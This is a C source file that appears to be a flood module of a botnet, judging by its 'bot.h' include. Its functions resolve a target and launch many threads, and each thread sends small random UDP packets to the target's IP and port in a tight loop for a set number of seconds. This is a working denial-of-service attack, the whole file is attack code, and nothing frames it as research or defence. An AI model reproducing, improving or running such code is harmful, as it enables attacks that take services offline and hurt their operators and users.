#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *pps_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    XorShift64 *rng = rng_new();
    uint8_t buf[48];
    rng_fill(rng, buf, 48);
    int check = 1000;
    time_t end = time(NULL) + t->sec;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        sendto(fd, buf, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(fd); free(rng);
    return NULL;
}

void flood_pps(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, pps_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
